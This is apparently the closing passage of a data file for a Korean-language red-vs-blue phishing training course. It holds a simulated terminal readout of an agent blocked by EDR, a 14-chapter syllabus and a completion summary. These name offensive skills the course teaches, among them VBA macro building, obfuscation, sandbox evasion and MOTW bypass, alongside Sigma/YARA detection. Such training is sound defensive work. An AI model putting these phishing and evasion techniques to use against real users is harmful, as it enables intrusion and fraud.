              output: '🔴 [RED TEAM] Agent 상태 확인\n──────────────────────────────\nAgent ID: AGENT-4F2A\nStatus: ❌ DISCONNECTED\nLast Beacon: 14:35:14 (2분 전)\n\n원인: EDR이 wscript.exe 프로세스를 종료하고\n      네트워크 연결을 차단했습니다.\n\n→ 공격 실패! Blue Team의 Sigma 규칙이 탐지 성공!\n\n🏁 시뮬레이션 결과:\n  Red Team: 게이트웨이/샌드박스 우회 성공\n  Blue Team: EDR + Sigma 규칙으로 최종 차단\n  \n  → 다층 방어의 효과를 체험했습니다.',
            },
          ],
        }
      },
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '14챕터 전체 요약 — 당신이 배운 것' },
            { type: 'code', label: '학습 여정 맵', text: '[공격자 파트]\nCh.1  피싱 도구 (GoPhish, SET)         → 도구의 존재와 역할\nCh.2  이메일 프로토콜 (SMTP/SPF/DKIM)   → 기술적 원리\nCh.3  T1566.001 킬 체인                → 공격 전체 흐름\nCh.4  코드 복습 (VBA, PowerShell)       → 코드 이해\nCh.5  나만의 도구 만들기                → 직접 구현\nCh.6  모의 환경 실습                    → 실전 체험\nCh.7  도구 해부                         → 내부 동작 원리\nCh.8  상용 도구 비교                    → 격차 분석\nCh.9  중간 정리 + 선택                  → 성취 확인\n\n[방어자 파트]\nCh.10 방어 메커니즘                     → 다층 방어 구조\nCh.11 우회 원리                         → 약점 분석\nCh.12 실전 우회 (난독화+샌드박스)       → 우회 적용\nCh.13 탐지 규칙 작성 (Sigma/YARA)      → 방어 구현\nCh.14 Red vs Blue 종합 시뮬레이션       → 공방 체험' },
          ]
        }
      },
      {
        type: 'celebration',
        config: {
          type: 'final',
          summary: [
            { emoji: '🗡️', label: '공격자 관점 습득', description: '피싱 도구, 이메일 프로토콜, 킬 체인, 매크로 작성까지 공격의 전체 과정을 이해했습니다.' },
            { emoji: '🧩', label: '직접 도구 제작', description: 'Python 이메일 생성기와 VBA 매크로를 직접 조립하고, 모의 환경에서 테스트했습니다.' },
            { emoji: '🛡️', label: '방어 기술 이해', description: '이메일 게이트웨이, 샌드박스, EDR, 사용자 교육 — 4단계 다층 방어를 체험했습니다.' },
            { emoji: '🔓', label: '우회 기법 체험', description: '난독화, 샌드박스 탐지, MOTW 우회 등 실제 APT가 사용하는 기법을 실습했습니다.' },
            { emoji: '📝', label: 'Sigma/YARA 규칙 작성', description: 'SOC 분석관의 시각으로 탐지 규칙을 직접 작성하고 적용했습니다.' },
            { emoji: '⚔️', label: 'Red vs Blue 종합', description: '공격과 방어 양쪽을 모두 수행하는 종합 시뮬레이션을 완료했습니다.' },
          ],
        }
      },
    ],
  },
];
